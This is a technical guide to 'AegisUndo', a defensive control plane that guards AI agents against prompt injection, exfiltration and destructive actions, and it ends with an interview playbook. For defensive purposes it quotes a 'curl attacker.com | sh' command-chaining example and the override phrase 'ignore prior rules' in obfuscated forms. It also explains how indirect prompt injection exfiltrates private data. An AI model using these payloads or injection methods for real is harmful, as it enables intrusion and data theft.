# AegisUndo — Complete Code Architecture & Master Technical Guide
> **Purpose**: A comprehensive, function-by-function manual explaining **why each line was written**, **how each component works under the hood**, and **how to explain this entire system from scratch** to any technical interviewer, architect, or client.

---

# Table of Contents
1. [High-Level Architectural Blueprint](#1-high-level-architectural-blueprint)
2. [Module 1: The Cryptographic State Foundation (`src/aegis/models.py`)](#2-module-1-the-cryptographic-state-foundation-srcaegismodelspy)
3. [Module 2: Zero-Trust Cryptography & Vault (`src/aegis/crypto/`)](#3-module-2-zero-trust-cryptography--vault-srcaegiscrypto)
   - [2.1 Owner Authentication (`owner_auth.py`)](#21-owner-authentication-owner_authpy)
   - [2.2 Encrypted Vault & Canary Tripwires (`vault.py`)](#22-encrypted-vault--canary-tripwires-vaultpy)
4. [Module 3: The Live Machine Guardian (`src/aegis/guardian/`)](#4-module-3-the-live-machine-guardian-srcaegisguardian)
   - [3.1 Shadow Snapshot Store & Atomic Rollback (`snapshots.py`)](#31-shadow-snapshot-store--atomic-rollback-snapshotspy)
   - [3.2 Real-Time OS File Watcher & WebSockets (`watcher.py`)](#32-real-time-os-file-watcher--websockets-watcherpy)
   - [3.3 Native Desktop Notifier (`notifier.py`)](#33-native-desktop-notifier-notifierpy)
   - [3.4 Git Pre-Commit Hard Blocker (`git_hook.py`)](#34-git-pre-commit-hard-blocker-git_hookpy)
   - [3.5 Local MCP Stdio Firewall (`mcp_stdio_firewall.py`)](#35-local-mcp-stdio-firewall-mcp_stdio_firewallpy)
5. [Module 4: Static Architecture Audit Engine (`src/aegis/scanner/engine.py`)](#5-module-4-static-architecture-audit-engine-srcaegisscannerenginepy)
6. [Module 5: Adversarial Fine-Tuning & ML Guardrails (`src/aegis/ml/`)](#6-module-5-adversarial-fine-tuning--ml-guardrails-srcaegisml)
   - [5.1 Adversarial Classifier & Obfuscation De-cloaker (`classifier.py`)](#51-adversarial-classifier--obfuscation-de-cloaker-classifierpy)
   - [5.2 Dataset Generator & Multi-LLM Exporters (`dataset.py`)](#52-dataset-generator--multi-llm-exporters-datasetpy)
   - [5.3 PyTorch PEFT/LoRA DPO Trainer (`lora_trainer.py`)](#53-pytorch-peftlora-dpo-trainer-lora_trainerpy)
7. [Module 6: Runtime Policy, Token Broker & Surgical Undo (`src/aegis/runtime/`)](#7-module-6-runtime-policy-token-broker--surgical-undo-srcaegisruntime)
   - [6.1 Multi-Provider 7-Layer Proxy (`proxy.py`)](#61-multi-provider-7-layer-proxy-proxypy)
   - [6.2 Deterministic Policy & Threat Screening (`policy.py`)](#62-deterministic-policy--threat-screening-policypy)
   - [6.3 Ephemeral Capability Token Broker (`tokens.py`)](#63-ephemeral-capability-token-broker-tokenspy)
   - [6.4 Conflict-Aware Surgical DB Undo Engine (`undo_db.py`)](#64-conflict-aware-surgical-db-undo-engine-undo_dbpy)
   - [6.5 Provenance Memory Guard & Lineage Quarantine (`memory_guard.py`)](#65-provenance-memory-guard--lineage-quarantine-memory_guardpy)
   - [6.6 GitOps Infrastructure-as-Code Guard (`gitops_guard.py`)](#66-gitops-infrastructure-as-code-guard-gitops_guardpy)
8. [Module 7: FastAPI Control Plane & CLI (`app.py` & `cli.py`)](#8-module-7-fastapi-control-plane--cli-apppy--clipy)
9. [Interview Master Playbook: How to Explain This Project from Scratch](#9-interview-master-playbook-how-to-explain-this-project-from-scratch)

---

# 1. High-Level Architectural Blueprint

When autonomous AI agents (OpenAI, Anthropic Claude, Google Gemini, or local models) connect to company systems, they gain access to databases, cloud infrastructure, internal APIs, and file systems.

**The Fundamental Flaw of Traditional AI Security:**
Most systems rely on *prompt engineering* ("Please do not reveal secrets") or an *LLM judge* (asking a second LLM if the first LLM misbehaved). Both are probabilistic and vulnerable to prompt injection, jailbreaks, and indirect injection through untrusted documents.

**The AegisUndo Philosophy:**
1. **Never trust the LLM**: Deterministic gates outside the model decide what can execute.
2. **Cryptographic verification for high-blast-radius actions**: Secret unsealing, money transfers, and infrastructure changes require offline human asymmetric keys (`Ed25519`) and rotating OTP codes (`TOTP`).
3. **Assume breach, enable surgical undo**: If a bad action executes, automatically rewind it (database rows, poisoned vector memories, or developer files) without destroying concurrent legitimate human work.

```
                      ┌──────────────────────────────────────────┐
                      │    Developer / AI Agent Runtime          │
                      └─────────────────────┬────────────────────┘
                                            │ Tool Call / File Save
                                            ▼
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                                AegisUndo Control Plane                                 │
│                                                                                        │
│  Layer 1: Emergency Lockdown Check (Canary Tripwire state)                             │
│  Layer 2: Canary Honeytoken Detection (Auto-lockdown on exfiltration)                  │
│  Layer 3: Ephemeral Token Broker (5-min capability tokens, speed/volume ceilings)      │
│  Layer 4: Lethal-Trifecta Taint State Machine (Confidential Read + Untrusted Input)    │
│  Layer 5: Deterministic Policy Engine (SQL AST, SSRF block, PII redaction)             │
│  Layer 6: Adversarial Fine-Tuned Semantic Guardrail (De-obfuscation + n-gram ML)       │
│  Layer 7: Offline Ed25519 + RFC 6238 TOTP Owner Cryptographic Verification             │
└───────────────────────────────────────────┬────────────────────────────────────────────┘
                                            │
                        ┌───────────────────┴───────────────────┐
                        ▼                                       ▼
             [Allowed Reversible Action]             [Irreversible / Secret Action]
                        │                                       │
            ┌───────────┴───────────┐                           ▼
            ▼                       ▼                Requires OwnerSignatureProof
     Database Mutation        Memory Ingestion       (Offline Ed25519 Private Key
   (UndoableDBEngine logs   (ProvenanceMemoryStore   + Authenticator 6-digit TOTP)
    before/after delta)      tracks read lineage)               │
            │                       │                           ▼
            ▼                       ▼                     [Action Released]
     1-Click Rollback        Poison Quarantine
```

---

# 2. Module 1: The Cryptographic State Foundation (`src/aegis/models.py`)

### Why It Was Implemented
Security systems fail when their audit logs can be altered, when tokens never expire, or when database changes lack provenance. `models.py` provides the strongly typed data models (SQLAlchemy 2.0 ORM + Pydantic v2) for all security transactions.

### Key Database Tables & What They Do:

1. **`OwnerKeyRecord`**:
   - *Purpose*: Stores the **public key only** (`Ed25519`) of authorized human owners, their role (`PRIMARY_OWNER`, `CISO`, `FINANCE`), and their hashed/encrypted Base32 TOTP secret.
   - *Security Property*: The private key is **never stored** in the database. Even a complete database dump gives an attacker zero ability to forge an Owner signature.

2. **`ConsumedNonceRecord`**:
   - *Purpose*: Tracks single-use cryptographic random nonces (`nonce`, `owner_id`, `consumed_at`).
   - *Security Property*: Prevents **Replay Attacks**. If an attacker captures an Owner's valid signature off the network, submitting it a second time fails because the nonce is recorded as consumed.

3. **`VaultSecretRecord`**:
   - *Purpose*: Holds company crown-jewel credentials encrypted with **AES-256-GCM**.
   - *Fields*: `ciphertext_b64`, `nonce_b64`, `salt_b64`, `key_derivation_algorithm="PBKDF2-HMAC-SHA256"`.
   - *Security Property*: The AES key is derived using an ephemeral master seed and only released when verified by `OwnerSignatureProof`.

4. **`CanaryTokenRecord` & `SystemLockdownRecord`**:
   - *Purpose*: Manages fake decoy credentials planted across databases and API responses.
   - *Fields*: `token_value` (e.g. `AEGIS-CANARY-7a1b...`), `planted_location`, `tripped_at`.
   - *Security Property*: When an agent touches this token, `SystemLockdownRecord` writes an immutable flag `is_locked=True`. All active sessions are immediately revoked.

5. **`AgentSessionRecord`**:
   - *Purpose*: Manages 5-minute scoped visitor badges for AI agents.
   - *Fields*: `session_token_hash` (raw token is never saved), `allowed_tools`, `is_tainted`, `taint_reason`, `confidential_reads_count`, `calls_made_this_minute`.
   - *Security Property*: Tracks the **Lethal-Trifecta State Machine**. If `is_tainted=True` (the session read confidential data while exposed to untrusted external text), outgoing egress tools are automatically blocked.

6. **`AuditLedgerRecord` (Cryptographic Hash Chain)**:
   - *Purpose*: Tamper-evident ledger of every decision made by Aegis.
   - *Fields*: `event_id`, `prev_record_hash`, `record_hash`, `payload_digest`, `timestamp`.
   - *Security Property*: Every record computes:
     $$\text{record\_hash} = \text{SHA-256}(\text{prev\_record\_hash} \parallel \text{event\_id} \parallel \text{action} \parallel \text{payload\_digest})$$
     If an insider or attacker modifies a database row to hide an exfiltration event, the entire hash chain breaks, alerting the SOC immediately.

7. **`DatabaseMutationRecord`**:
   - *Purpose*: Tracks granular row-level deltas for surgical rollbacks.
   - *Fields*: `agent_run_id`, `table_name`, `row_primary_key`, `before_state_json`, `after_state_json`.
   - *Security Property*: Enables the Undo Engine to revert only the rows modified by a compromised agent run, while detecting and preserving human edits that happened afterward.

---

# 3. Module 2: Zero-Trust Cryptography & Vault (`src/aegis/crypto/`)

## 2.1 Owner Authentication (`owner_auth.py`)

### The Threat
- **Prompt Injections & Rogue Agents**: An LLM is tricked into transferring funds or exporting customer databases.
- **Deepfake Attacks**: A hacker clones the CEO's voice on a live phone call or Zoom meeting demanding an emergency wire transfer (e.g., the \$25.6M Hong Kong deepfake fraud).

### The Solution: `OwnerVerificationEngine`
Requires an offline **Ed25519 asymmetric signature** + a rotating 6-digit **RFC 6238 TOTP code** for all critical actions.

```
       [Owner Device (Offline)]                       [Aegis Server]
 ┌──────────────────────────────────┐        ┌──────────────────────────────┐
 │ 1. Private Key (Ed25519)         │        │ 1. Public Key (Stored in DB) │
 │ 2. Canonical Digest:             │        │ 2. Compute canonical digest  │
 │    SHA256(op||target||args||nonce)        │ 3. ed25519_verify(sig, pub)  │
 │ 3. Sign digest -> signature_b64  │───────►│ 4. Verify TOTP 6-digit code  │
 │ 4. Generate 6-digit TOTP code    │ Proof  │ 5. Check Nonce not consumed  │
 └──────────────────────────────────┘        └──────────────────────────────┘
```

### Key Functions Explained:

1. **`enroll_owner(owner_id, display_name, role, enable_totp) -> OwnerEnrollmentBundle`**:
   - Generates an Ed25519 keypair: `ed25519.Ed25519PrivateKey.generate()`.
   - Exports the public key as OpenSSL PEM format and stores it in SQLite.
   - Generates a random Base32 TOTP secret (`pyotp.random_base32()`) and creates an `otpauth://` URI for Apple Authenticator / Google Authenticator.
   - Returns the **private key PEM** once to the user to save offline.

2. **`sign_action_offline(private_key_pem, owner_id, operation, target_resource, canonical_params, ...) -> OwnerSignatureProof`**:
   - Builds a canonical sorted JSON string of `canonical_params` to avoid hash discrepancies caused by whitespace or key ordering:
     ```python
     canonical_str = json.dumps(canonical_params, sort_keys=True, separators=(",", ":"))
     ```
   - Computes a message digest over:
     `{owner_id}:{operation}:{target_resource}:{canonical_str}:{nonce}:{expires_at_unix}`
   - Signs the SHA-256 digest using the offline Ed25519 private key:
     ```python
     priv_key.sign(digest.encode("utf-8"))
     ```
   - Computes current 6-digit TOTP code and returns `OwnerSignatureProof`.

3. **`verify_owner_proof(proof, operation, target_resource, canonical_params) -> VerificationResult`**:
   - **Step A: Expiration check**: Rejects if current UNIX time exceeds `proof.expires_at_unix`.
   - **Step B: Replay check**: Queries `ConsumedNonceRecord`. If `nonce` was already consumed, returns `Replay Attack Blocked`.
   - **Step C: Cryptographic Ed25519 verify**: Re-computes the canonical digest over the target parameters and calls `public_key.verify(sig, digest)`. If a single argument was tampered with (e.g. `$100` changed to `$100,000`), the signature math fails instantly.
   - **Step D: TOTP validation**: Checks the 6-digit code with `valid_window=1` (accepting current or previous 30-second window to tolerate minor clock skew).
   - **Step E: Nonce consumption**: Writes `nonce` to `ConsumedNonceRecord` in SQLite inside an atomic transaction.

4. **`verify_quorum(proofs, required_quorum, operation, ...) -> tuple[bool, list[str], list[str]]`**:
   - Implements **M-of-N Multi-Owner Quorum** (e.g., both CEO AND CISO must independently sign before customer crown-jewels can be exported).
   - Ensures distinct owner identities (prevents the same owner from signing twice to satisfy quorum).

---

## 2.2 Encrypted Vault & Canary Tripwires (`vault.py`)

### 1. `ZeroTrustDataVault`:
- Encrypts all sensitive company secrets at rest using **AES-256-GCM** (authenticated encryption with associated data).
- Derives a 256-bit encryption key using **PBKDF2-HMAC-SHA256** with 100,000 iterations and a cryptographically secure 16-byte random salt.
- In `unseal_record_with_owner_proof`: Even if an autonomous agent or database administrator requests the secret, the vault will **refuse to decrypt** unless accompanied by a verified `OwnerSignatureProof`.

### 2. `CanaryTripwireEngine`:
- Plants synthetic honeytokens in high-value database rows: e.g. `AEGIS-CANARY-VIP-KEY-8f3a2c`.
- In `check_string_for_canaries(text)`: Inspects all outbound agent tool arguments, prompt responses, and webhook payloads using high-speed regex matching.
- **The Tripwire Cascade**: The moment a canary token is spotted leaving the system:
  1. Activates `SystemLockdownRecord` globally.
  2. Revokes all active agent capability tokens instantly.
  3. Dispatches native desktop alerts and SOC notifications.
  4. Requires an offline Ed25519 Owner signature with operation `WORKSPACE_UNLOCK` to restore operations.

---

# 4. Module 3: The Live Machine Guardian (`src/aegis/guardian/`)

This module protects developers and autonomous coding agents (like Cursor, Claude Desktop, or VS Code) working on their local workstation.

```
                  Developer Saves File (Cmd+S)
                               │
                               ▼
                    [LiveWorkspaceGuardian]
                    (Rust-backed awatch loop)
                               │
                               ▼
                     [ShadowSnapshotStore]
                  (Loads last-clean baseline)
                               │
            ┌──────────────────┴──────────────────┐
            ▼                                     ▼
      [File Clean]                         [Weakness Detected]
  Promote to new clean baseline                   │
                                   ┌──────────────┴──────────────┐
                                   ▼                             ▼
                          Mode: Alert + 1-Click        Mode: Auto-Undo Shield
                                   │                             │
                                   ▼                             ▼
                          Send macOS Alert              Atomic Restore to Disk (<15ms)
                          Stream WebSocket Diff         Send Alert: "Auto-Undone!"
                          Show Undo Button in UI        Broadcast UI Card
```

## 3.1 Shadow Snapshot Store (`snapshots.py`)
Maintains in-memory baselines of every clean file in the developer's workspace.

- **`prime_baselines()`**: Scans all files in `workspace_root` at startup using `ArchitectureScanner`. Any file scoring 0 findings is stored in `_clean_baselines[rel_path]`.
- **`inspect_saved_file(file_path)`**:
  - Executes in **milliseconds** on every file save.
  - Generates unified diffs using Python's `difflib.unified_diff` comparing the clean baseline against the new saved file.
  - **Self-Trigger Loop Prevention (`_internal_write_hashes`)**: When Aegis automatically reverts a file on disk, that disk write triggers the OS file watcher again. To prevent an infinite alert loop, Aegis caches `sha256(restored_content)`. When the subsequent event arrives with that hash, it is silently acknowledged and ignored.
  - **Deduplication (`_last_active_hashes`)**: Prevents duplicate UI alerts if multiple file events fire for the same unchanged save.
- **`undo_incident(incident_id)`**: Atomically writes `prior_clean` back to disk, restoring the developer's workstation to the safe state.
- **`approve_exception_with_owner(incident_id, owner_id)`**: If an engineer legitimately needs to use an API key or raw SQL, the Owner signs an Ed25519 exception. The exception is hashed and cached in `_owner_exceptions`, allowing that exact file hash to persist on disk without triggering future alerts.

## 3.2 Real-Time Watcher & WebSockets (`watcher.py`)
- Uses `watchfiles.awatch` (a high-performance Rust `notify` binding).
- Runs an asynchronous event loop that debounces rapid multi-file saves (120ms debounce window).
- Maintains active client connections (`_clients: Set[WebSocket]`) and broadcasts:
  - `INIT_STATE`: Full state on initial connection.
  - `NEW_INCIDENT`: Instant card delivery with colorized diffs and severity rankings.
  - `INCIDENT_UPDATED`: When an incident is undone or approved.

## 3.3 Native Desktop Notifier (`notifier.py`)
- Dispatches macOS Notification Center alerts using `/usr/bin/osascript`:
  ```applescript
  display notification "Reverted CRITICAL mistake in 14.2ms" with title "Aegis Live Machine Guardian" subtitle "app_agent.py [AEGIS-SEC-001]" sound name "Basso"
  ```
- **Security Engineering**: Executes with `shell=False` and a restricted environment `env={"PATH": "/usr/bin:/bin"}` to prevent command injection.
- Respects `AEGIS_DISABLE_DESKTOP_NOTIFY=1` during automated unit tests so developers aren't spammed with OS alerts during CI/CD runs.

## 3.4 Git Pre-Commit Hard Blocker (`git_hook.py`)
- Installs an executable script at `.git/hooks/pre-commit`:
  ```sh
  #!/bin/sh
  # AEGIS-UNDO-PRE-COMMIT-GUARD
  python -m aegis.cli scan . --fail-under 95
  ```
- If a developer or rogue script attempts to run `git commit` on code containing hardcoded secrets, `shell=True`, or vulnerable MCP configs, the hook exits with code 1, **physically aborting the commit** before the bad code enters Git history.

## 3.5 Local MCP Stdio Firewall (`mcp_stdio_firewall.py`)
- Wraps local Model Context Protocol (MCP) stdio servers in Claude Desktop or Cursor:
  ```json
  "command": "aegis", "args": ["mcp-wrap", "--", "npx", "-y", "@modelcontextprotocol/server-filesystem@0.6.2", "./data"]
  ```
- **`evaluate_jsonrpc_line(raw_line)`**: Inspects every JSON-RPC line on standard input before it reaches the child MCP process.
- If a tool call contains SSRF (`http://169.254.169.254`), path traversal, or forbidden destructive calls:
  - The line is **dropped** (never forwarded to the child tool).
  - Returns JSON-RPC standard error code `-32001` to the LLM.
  - Fires an immediate desktop alert notifying the developer.

---

# 5. Module 4: Static Architecture Audit Engine (`src/aegis/scanner/engine.py`)

### What It Does
Audits an entire codebase across **Python AST, MCP JSON configs, Dockerfiles, and Terraform manifests** against **13 enterprise security rules** aligned with the **NIST AI Risk Management Framework (AI RMF 1.0)**.

### The 13 Security Rules Explained:

| Rule ID | Name & Target | What the Code Checks | Why It Is Dangerous |
| :--- | :--- | :--- | :--- |
| **`AEGIS-SEC-001`** | Raw Credential & Env Leak | Scans text for OpenAI, Anthropic, AWS, Stripe keys; checks `subprocess.*` for wholesale `os.environ`. | Exposes production credentials to LLM prompt injection or child agent processes. |
| **`AEGIS-MCP-002`** | MCP Tool & Transport Security | Scans `mcp_config.json` for unpinned `npx -y` packages, unencrypted `http://` URLs, and root filesystem mounts (`/`). | Supply chain tool poisoning, remote MITM injection, and arbitrary host file reads. |
| **`AEGIS-DB-003`** | Direct Destructive SQL | AST checks calls to `.execute()` containing `DELETE`, `UPDATE`, `DROP` without using `UndoableDBEngine`. | A single prompt injection can overwrite or wipe production database rows with zero rollback ledger. |
| **`AEGIS-EXEC-004`** | Unsandboxed Execution | AST checks for `eval()`, `exec()`, `os.system()`, or `subprocess.*(..., shell=True)`. | Direct command chaining (`curl attacker.com \| sh`) and host sandbox breakouts. |
| **`AEGIS-HITL-005`** | Irreversible External Action | AST checks for `send_wire_transfer`, `delete_bucket`, `send_email` without a `PolicyEngine` gate. | Irreversible financial or brand damage from 1-shot prompt injection. |
| **`AEGIS-MEM-006`** | Unattributed Vector Memory Write | AST checks for `.add_documents()` or `upsert()` lacking `source_trust` or `source_doc_id`. | Memory poisoning: untrusted external data sits permanently in RAG memory, poisoning future decisions. |
| **`AEGIS-PROMPT-007`** | Dynamic System Prompt Injection | AST checks for dynamic f-strings inside `{"role": "system", "content": f"..."}`. | Elevates untrusted user/email text to highest system instruction privilege. |
| **`AEGIS-DOCKER-008`** | Container Runs as Root | Checks `Dockerfile` for missing `USER` directive or running as UID 0. | Trivial container escapes giving host root privilege if agent is compromised. |
| **`AEGIS-IAC-009`** | Cloud IaC Wildcards & Ingress | Scans Terraform `.tf` for `0.0.0.0/0` CIDR blocks or IAM `Action = ["*"]`. | Broad exposure to internet scanning and cloud account takeover. |
| **`AEGIS-LOOP-010`** | Unbounded Agent Loop | AST checks for `while True:` loops lacking `max_steps`, `budget`, or circuit breakers. | Runaway agent swarms, recursive tool loops, and massive API token billing drain. |
| **`AEGIS-JUDGE-011`** | Sole Reliance on LLM Judge | AST checks for safety architectures using only `llm_safety_judge` without deterministic non-AI code gates. | Adversarial jailbreak strings that bypass both the worker model and the judge model simultaneously. |
| **`AEGIS-DEEPFAKE-012`**| Audio/Video Approval Bypass | AST checks financial/payout tools that rely on voice/video/chat approval flags. | Real-time synthetic voice and video clones trivially spoof human approvals. |
| **`AEGIS-OWN-013`** | Forgable Boolean Auth Flag | AST checks critical tools relying on `approved=True` in JSON instead of `OwnerVerificationEngine`. | Jailbroken agents simply supply `approved=True` in their tool arguments. |

### Scoring Algorithm:
Starts at **100 points**. Deducts:
- **-18 points** per `CRITICAL` finding
- **-10 points** per `HIGH` finding
- **-6 points** per `MEDIUM` finding
- **-2 points** per `LOW` finding

Produces SARIF v2.1.0 output (compatible with GitHub Advanced Security code scanning tab) and human-readable Rich CLI tables.

---

# 6. Module 5: Adversarial Fine-Tuning & ML Guardrails (`src/aegis/ml/`)

## 5.1 Classifier & De-cloaker (`classifier.py`)
Simple regex filters fail when attackers obfuscate payloads:
- Spaced text: `i g n o r e   p r i o r   r u l e s`
- Base64 encoding: `aWdub3JlIHByaW9yIHJ1bGVz`
- Leetspeak substitution: `1gn0r3 pr10r rul3s`

### The 3-Stage Detection Pipeline:
1. **De-obfuscation Normalizer (`normalize_adversarial_text`)**:
   - Strips zero-width unicode characters (`\u200b`, `\ufeff`).
   - Replaces leetspeak mappings (`@` -> `a`, `0` -> `o`, `$` -> `s`, `1` -> `i`).
   - Normalizes spaced characters: detects sequences like `i g n o r e` and collapses them to `ignore`.
   - Automatically detects and decodes embedded Base64 strings.
2. **Dual-Vector TF-IDF Feature Extraction**:
   - `word_vectorizer`: Extracts word n-grams (1 to 3 words) with sublinear term-frequency scaling.
   - `char_vectorizer`: Extracts character n-grams (3 to 6 characters), enabling the model to catch partial subword root matches even under novel misspellings.
   - Combines both feature spaces using `scipy.sparse.hstack`.
3. **Calibrated Logistic Classifier**:
   - Trained with balanced class weights.
   - Threshold set to `0.55` to minimize false-positive disruption while detecting subtle injections.
4. **Cryptographic Weight Verification (`save_verified_checkpoint`)**:
   - When saving trained weights, Aegis computes the exact **SHA-256 digest** of the model binary and writes an immutable manifest `checkpoint_manifest.json`.
   - On load, `load_verified_checkpoint()` verifies the SHA-256 before deserializing. If an attacker replaces the `.joblib` model file with a trojaned model, loading aborts with a runtime error.

## 5.2 Multi-LLM Dataset Exporters (`dataset.py`)
`aegis finetune` does not just train a local classifier—it auto-generates training sets formatted specifically for fine-tuning major LLMs:
1. **OpenAI SFT JSONL**: Formatted for `gpt-4o-mini` supervised fine-tuning (`{"messages": [{"role": "system", ...}, {"role": "user", ...}, {"role": "assistant", ...}]}`).
2. **HuggingFace TRL LoRA DPO JSONL**: Direct Preference Optimization format with `prompt`, `chosen` (safe rejection), and `rejected` (unsafe compliance) pairs for training **Llama-3.2, Gemma-2, or Qwen**.
3. **Google Cloud Vertex Gemini JSONL**: Input/output pairs formatted for Google Vertex AI Gemini tuning.

## 5.3 PyTorch PEFT/LoRA Trainer (`lora_trainer.py`)
Provides validation and execution hooks for fine-tuning open-weights models locally using LoRA (Low-Rank Adaptation) via HuggingFace `peft` and `trl` (`meta-llama/Llama-3.2-3B-Instruct`), targeting attention projection matrices (`q_proj`, `v_proj`, `k_proj`, `o_proj`).

---

# 7. Module 6: Runtime Policy, Token Broker & Surgical Undo (`src/aegis/runtime/`)

## 6.1 Multi-Provider 7-Layer Proxy (`proxy.py`)
Sits inline between your AI agent framework (LangChain, LlamaIndex, AutoGen, CrewAI, or raw API calls) and upstream providers (**OpenAI, Anthropic Claude, Google Gemini, and MCP**).

### Interception Sequence (`intercept()`):
1. **Layer 1: Canary Lockdown**: Checks if the workspace is frozen due to a tripped canary token. If yes, all calls return immediately with `workspace_locked=True`.
2. **Layer 2: Honeytoken Scanner**: Inspects payload arguments for any canary token string. If found, trips global lockdown and revokes the agent session.
3. **Layer 3: Session Token Validation**: Checks `session_token` via `TokenBroker`. Verifies expiration, call rate limits, and total budget.
4. **Layer 4: Lethal-Trifecta Taint Lock**: If the session has read confidential data AND untrusted input, all outgoing internet/egress tools are hard-blocked.
5. **Layer 5: Policy Gate**: Scans SQL statements for un-audited `DELETE`/`UPDATE`, detects SSRF cloud-metadata IP addresses (`169.254.169.254`), and redacts PII.
6. **Layer 6: ML Guardrail**: Runs the de-obfuscator and fine-tuned classifier on untrusted text blocks.
7. **Layer 7: Owner Verification**: If the tool is classified as `REQUIRE_OWNER_SIGNATURE` (wires, vault unseal, schema drops), execution pauses in an `ApprovalRequest` queue awaiting offline Ed25519 signature.

## 6.2 Token Broker & Lethal-Trifecta State Machine (`tokens.py`)

### The Threat: The "Lethal Trifecta"
Security research (e.g., Johann Rehberger / Simon Willison) identifies the most dangerous agentic vulnerability:
1. **Access to Private Data** (e.g. reading customer emails, database rows, or internal documents).
2. **Exposure to Untrusted Input** (e.g. reading a public support ticket or external web page).
3. **Communication / Egress Channel** (e.g. tool to send emails, webhooks, or HTTP requests).

When all three exist simultaneously, an indirect prompt injection in the untrusted input instructs the agent to read the private data and transmit it out through the communication channel.

### The Solution: Taint Tracking State Machine
- When an agent calls a read tool (e.g. `read_customer_pii`), `TokenBroker.record_confidential_read(session_id)` increments the read counter.
- If `untrusted_context` is present during or prior to that read, `mark_tainted(session_id, reason)` permanently sets `is_tainted=True` on the session record.
- Any subsequent attempt in that session to invoke outbound egress tools (`fetch_webhook`, `send_email`, `http_post`) is **hard-blocked by the proxy**, regardless of what the LLM says.

## 6.3 Conflict-Aware Surgical DB Undo Engine (`undo_db.py`)

### The Threat
A compromised agent runs an un-audited update modifying 5 customer orders to `$0.00`. If you restore a full database backup from 10 minutes ago, you destroy all the legitimate human transactions that occurred during those 10 minutes.

### The Solution: Row-Level Delta Snapshots with Conflict Detection
- **`execute_mutation(agent_run_id, table, updates, where_clause, ...)`**:
  - Automatically queries the exact rows matching the `where_clause` **before** executing the update.
  - Serializes each row's exact state to JSON (`before_state_json`).
  - Executes the update within a transaction.
  - Reads the new state (`after_state_json`) and logs both to `DatabaseMutationRecord`.
- **`rollback_run(agent_run_id, force_overwrite_conflicts=False)`**:
  - Reads all mutations logged for that specific `agent_run_id` in reverse chronological order.
  - **Conflict Detection Algorithm**: For each row, queries its *current* database value. If the current value does NOT match `after_state_json`, a human or another process modified that row *after* the agent ran!
  - By default, Aegis **skips the conflicting row** (preserving the human customer's legitimate update!) and reverts only the un-tampered rows.
  - Returns a detailed audit report: `reverted_count`, `skipped_human_conflicts`.

## 6.4 Provenance Memory Store (`memory_guard.py`)
- **`write_memory(content, source_trust, source_doc_id, created_by_run)`**:
  - Classifies memory into trust tiers: `TRUSTED_SYSTEM`, `VERIFIED_INTERNAL`, or `UNTRUSTED_EXTERNAL`.
- **`retrieve_for_decision(decision_id, agent_run_id, query, action_taken)`**:
  - Whenever an agent retrieves a memory chunk to make a decision, Aegis logs an immutable read-lineage link in `MemoryReadLineageRecord`.
- **`quarantine(source_doc_id)`**:
  - If a specific external email or document is found to be malicious, 1 click marks all memory chunks derived from it as `is_quarantined=True`.
  - Queries `MemoryReadLineageRecord` and provides SOC teams with the exact list of past historical agent decisions that were influenced by the poisoned memory!

---

# 8. Module 7: FastAPI Control Plane & CLI (`app.py` & `cli.py`)

## 8.1 Control Plane (`app.py`)
- **FastAPI Lifespan Management (`lifespan`)**:
  - On server boot, initializes `LiveWorkspaceGuardian` and launches the asynchronous file-watching task (`awatch`).
  - On server shutdown, cleanly cancels background watcher tasks and closes WebSocket client connections.
- **REST & WebSocket Endpoints**:
  - `GET /` & `GET /guardian`: Serves the 5-Tab SOC Dashboard and the dedicated Live Guardian Companion UI.
  - `WEBSOCKET /ws/guardian`: Full-duplex real-time incident event stream.
  - `POST /v1/owners/enroll` & `POST /v1/owners/sign-helper`: Cryptographic key enrollment and offline signature helper.
  - `POST /v1/vault/seal` & `POST /v1/vault/unseal`: Zero-Trust AES-256-GCM vault unsealing requiring `OwnerProofPayload`.
  - `POST /v1/guardian/mode`: Toggles between **Alert + 1-Click Undo** and **Strict Auto-Undo Shield**.
  - `POST /v1/guardian/incidents/{id}/undo`: 1-Click atomic file rewind.
  - `POST /v1/guardian/incidents/{id}/owner-approve`: Authorizes file exception via Ed25519 signature.

## 8.2 Command Line Interface (`cli.py`)
Built with `Typer` and `Rich`:
- `aegis watch`: Launches the live file-watching guardian alongside VS Code.
- `aegis install-hook`: Arms the Git pre-commit security blocker.
- `aegis mcp-wrap`: Inline stdio firewall for Claude Desktop / Cursor.
- `aegis scan`: 13-rule AST & IaC static architecture scanner.
- `aegis finetune`: Runs adversarial fine-tuning and exports SFT / LoRA DPO datasets.
- `aegis demo-zero-trust`: Automated 5-stage cryptographic proof.
- `aegis demo-undo`: Live database rollback & memory quarantine demonstration.
- `aegis verify-ledger`: Cryptographically validates the SHA-256 audit ledger hash chain.

---

# 9. Interview Master Playbook: How to Explain This Project from Scratch

When an interviewer or engineering director asks:  
**"Can you walk me through your AegisUndo project?"**

Use this structured 4-step framework:

### 1. The Hook (The Problem in 30 Seconds)
> *"Everyone is rushing to connect LLMs to databases, internal APIs, and terminal tools. But current AI security relies on prompt engineering and LLM-as-a-judge, which are probabilistic and trivially jailbroken. I built **AegisUndo**—a deterministic, zero-trust security control plane and live machine guardian that treats the LLM as an untrusted worker. Even if the LLM is 100% compromised, it mathematically cannot exfiltrate crown jewels, and any bad actions it takes can be surgically undone in milliseconds."*

### 2. The 3 Pillars (Architecture Overview)
> *"Aegis is divided into three core pillars:*
> 1. * **Prevention (The 7-Layer Proxy & Static Scanner)**: An architecture scanner that audits code across 13 security rules, paired with an inline proxy that uses session taint tracking to block the 'Lethal Trifecta' (reading private data + untrusted input + egress channels).*
> 2. * **Zero-Trust Human Authorization**: Sensitive operations—like decrypting our AES-256-GCM vault, releasing wire payouts, or overriding firewall rules—require offline human Owner verification using asymmetric Ed25519 digital signatures, RFC 6238 TOTP, and single-use nonces to eliminate deepfakes and replay attacks.*
> 3. * **Resilience (Surgical Undo & Live Guardian)**: An atomic file-watcher guardian that runs alongside developers in VS Code to auto-undo dangerous code saves in <15ms, paired with a conflict-aware database undo engine that rolls back compromised agent mutations without wiping concurrent human edits."*

### 3. The Deep-Dive Technical Detail (Show Strong Engineering Depth)
Pick one concrete subsystem to explain deeply:
- **If they ask about Cryptography**: Explain the canonical JSON serialization in `OwnerVerificationEngine`, how the digest is signed offline with Ed25519, and how the single-use `ConsumedNonceRecord` prevents replay attacks.
- **If they ask about Developer Experience / Systems**: Explain how `ShadowSnapshotStore` caches clean baselines, computes unified diffs in memory, uses internal write hash suppression to prevent recursive watcher loops, and auto-restores files in <15ms.
- **If they ask about Data Integrity**: Explain how `UndoableDBEngine` logs row-level `before_state_json` and `after_state_json`, and uses conflict detection during rollback to preserve concurrent human transactions.

